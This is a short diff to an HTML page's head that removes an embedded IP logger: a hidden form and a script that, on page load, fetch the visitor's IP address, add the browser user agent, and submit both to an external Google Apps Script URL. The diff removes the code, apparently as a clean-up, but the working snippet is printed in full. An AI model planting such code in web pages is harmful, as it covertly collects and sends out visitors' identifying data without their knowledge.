@@ -2,19 +2,7 @@
 <html lang="en">
 <head>
 
-<form id="ipLogger" method="POST" action="https://script.google.com/macros/s/AKfycbx-RcbMRafYRMbgq6njLwW8sEtPErGKGA17K7Sdl4QXn3Br5_IzhpRXlMayyCq6VQ0a1g/exec">
-  <input type="hidden" name="ip" id="ipField">
-  <input type="hidden" name="ua" id="uaField">
-</form>
-<script>
-fetch('https://api.ipify.org?format=json')
-  .then(r=>r.json())
-  .then(d=>{
-    document.getElementById('ipField').value=d.ip;
-    document.getElementById('uaField').value=navigator.userAgent;
-    document.getElementById('ipLogger').submit();
-  });
-</script>
+
 
     
     <meta charset="UTF-8">
